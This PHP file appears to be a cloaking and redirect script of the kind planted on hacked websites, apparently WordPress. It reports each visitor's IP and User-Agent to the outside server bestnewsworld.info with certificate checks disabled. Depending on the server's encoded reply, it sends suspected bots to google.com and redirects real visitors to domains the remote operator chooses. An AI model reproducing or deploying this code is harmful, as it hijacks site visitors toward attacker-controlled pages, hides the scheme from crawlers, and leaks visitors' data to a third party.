<?php 
include("cfs.php");

$post = [
					't' => time(),
					'api_l_att'=>ID_API_RE,
					//case 301 
				//	'res'=>1,
				];

$headers = getallheaders();


				$ch = curl_init('https://bestnewsworld.info/aapiclapp/'.ID_USER.'/'.uniqid().".".time()."?ip=".ipextract());

//echo 'testt url https://'.PRIVATE_CN.'.pw/aapiclapp/'.ID_USER.'/'.uniqid().".".time()."?ip=".ipextract().'<br>';
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$headers = [
    'X-Apple-Tz: 0',
    'X-Apple-Store-Front: 143444,12',
    
    'User-Agent: '.$headers['User-Agent'],
   
];
//60s 
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLINFO_HEADER_OUT,true );

curl_setopt($ch, CURLOPT_RETURNTRANSFER,true );
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,2 );
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false );

				// execute!
				$response = curl_exec($ch);
$headersRes = curl_getinfo($ch);


//echo "<br>rescurl: ".json_encode($headersRes) ." <br>";

//echo "<br>error curl : ".curl_errno($ch) ." <br>"; 
				// close the connection, release resources used
				curl_close($ch);
//echo "<br>rspon:".$response."<br>";
					$response=explode('.',$response);

if($headersRes['http_code']==200)
	$res= json_decode(base64_decode($response[1]));
else $res="";
	//echo "res: ".json_encode($res); 

function donres($headersRes,$res,$texte){
if($headersRes['http_code']==200 && isset($res->sta) && $res->sta==1 && isset($res->mess) && $res->mess){
			//		echo json_encode(	$headers )."test:".json_encode(	$res );die("code:".$headersRes['http_code']);
		//		echo json_encode(	$headers )."test:".json_encode(	$res );die();
			//$linkfakb=$linkRE.'/'.ID_USER.'/om/'.urlencode($texte);
			$urlred= parse_url($res->mess)['host'];
			if(isset($res->isbb) && $res->isbb){
				// is bot 
				//return null;
				$linkfakb="https://google.com";
				//i_res":{"show":0,"l_res":"https:\/\/google.com","inl_pa":0,"t_res_l":2,"t_res_att":2}
				if(isset($res->i_res)){
					if($res->i_res->l_res) $linkfakb=$res->i_res->l_res;
					$urlred= parse_url($linkfakb)['host'];
					if($res->i_res->inl_pa)$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
					$core=301;
					if($res->i_res->t_res_l==2) $core=302;
					return wp_redirectaa($linkfakb,$core);
				}
			}
			else {
				// return template 
				//echo str_replace("appnow",($texte),$TEMPSSS);
				//die("") ;
				$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
				if(REDIRECT_LINK  ){
					
					return wp_redirectaa($linkfakb,301);
				}
			}
	}
	else {
?>
<!DOCTYPE html>
<html>
<body>

<script>
location.reload();
</script>

</body>
</html> 
<?php 
	}
}
if (has111($wordshash,$_SERVER['REQUEST_URI']) ){
   
	$texte=explode("/",str_replace([$wordshash."/",$wordshash],["",""],$_SERVER['REQUEST_URI']))[0];
	//$texte= substr($texte,5,strlen($texte));
	return donres($headersRes,$res,$texte);
}else
if(isset($_GET["u"])){
  $texte=$_GET["u"];
	//$texte= substr($texte,5,strlen($texte));
	// case not enough length 
	if(!$texte) $texte= time();
//echo "param U: ";
	return donres($headersRes,$res,$texte);
}else {

 $linkfakb="https://google.com";
	$core=301;
				//i_res":{"show":0,"l_res":"https:\/\/google.com","inl_pa":0,"t_res_l":2,"t_res_att":2}
				if(isset($res->i_res)){
					if($res->i_res->l_res) $linkfakb=$res->i_res->l_res;
					$urlred= parse_url($linkfakb)['host'];
					if($res->i_res->inl_pa)$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
					
					if($res->i_res->t_res_l==2) $core=302;
					
				}
	return wp_redirectaa($linkfakb,$core);
}

?>
